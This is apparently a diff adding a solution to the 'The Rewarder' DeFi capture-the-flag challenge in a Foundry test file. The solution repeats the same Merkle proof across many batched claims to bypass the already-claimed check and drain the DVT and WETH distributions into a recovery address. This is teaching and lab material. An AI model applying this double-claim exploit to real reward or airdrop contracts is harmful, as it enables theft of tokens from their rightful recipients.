@@ -70,7 +70,6 @@ contract TheRewarderChallenge is Test {
             newRoot: dvtRoot,
             amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
         });
-
         // Create WETH distribution
         weth.approve(address(distributor), TOTAL_WETH_DISTRIBUTION_AMOUNT);
         distributor.createDistribution({
@@ -109,7 +108,7 @@ contract TheRewarderChallenge is Test {
         vm.startPrank(alice);
         distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
 
-        // Alice cannot claim twice
+        // // Alice cannot claim twice
         vm.expectRevert(TheRewarderDistributor.AlreadyClaimed.selector);
         distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
         vm.stopPrank(); // stop alice prank
@@ -148,8 +147,56 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+   
+    uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+    uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+    uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM_AMOUNT;
+    uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;
+    uint totalTxCount = dvtTxCount + wethTxCount;
+
+    console.log('address(player)');
+    console.log(address(player));
+
+    // Tokens array
+    IERC20[] memory tokensToClaim = new IERC20[](2);
+    tokensToClaim[0] = IERC20(address(dvt));
+    tokensToClaim[1] = IERC20(address(weth));
+
+    // Load leaves and root again so we can regenerate proofs
+    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+    bytes32[] memory dvtProof =  merkle.getProof(dvtLeaves, 188);
+    bytes32[] memory ethProof =  merkle.getProof(wethLeaves, 188);
+    
+
+    Claim[] memory claims = new Claim[](totalTxCount);
+    uint256 claimIndex = 0;
+
+    for (uint256 i = 0; i < totalTxCount; i++) {
+        // DVT claim
+        if(i < dvtTxCount) {
+            claims[claimIndex++] = Claim({
+            batchNumber: 0,
+            amount:  PLAYER_DVT_CLAIM_AMOUNT,
+            tokenIndex: 0,
+            proof: dvtProof
+        });
+        } else {
+            claims[claimIndex++] = Claim({
+            batchNumber: 0,
+            amount: PLAYER_WETH_CLAIM_AMOUNT,
+            tokenIndex: 1,
+            proof: ethProof
+        });
+        }
     }
+    distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+    // Send everything to recovery
+    dvt.transfer(recovery, dvt.balanceOf(player));
+    weth.transfer(recovery, weth.balanceOf(player));
+       
+}
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
